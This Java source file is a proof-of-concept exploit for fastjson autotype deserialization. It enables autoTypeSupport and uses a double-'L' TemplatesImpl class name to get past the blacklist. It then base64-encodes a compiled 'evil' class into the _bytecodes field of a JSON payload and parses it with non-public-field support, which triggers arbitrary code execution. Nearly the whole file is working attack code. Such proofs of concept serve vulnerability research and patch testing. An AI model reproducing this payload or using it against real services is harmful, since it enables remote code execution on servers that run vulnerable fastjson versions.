package com.customized.libs.core.libs.fastjson.bug;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Created by web on 2017/4/29.
 */
public class XsltcTrasletPoc {

    public static final String NASTY_CLASS = "LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;";

    static {
        // 这个设置很重要（从v1.2.25开始，fastjson默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。）
        System.setProperty("fastjson.parser.autoTypeSupport", "true");
    }

    public static String readClass(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String separator = System.getProperty("file.separator");
        String path = "com.customized.libs.core.libs.fastjson.bug.poc.XsltcTransletSerializeExploit";
        path = path.replaceAll("\\.", "/");

        final String evilClassPath =
                System.getProperty("user.dir") + "/core/target/classes/" + path + ".class";
        String evilCode = readClass(evilClassPath);
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\"" + evilCode + "\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);

        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        //assertEquals(Model.class, obj.getClass());
    }

    public static void main(String[] args) {
        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}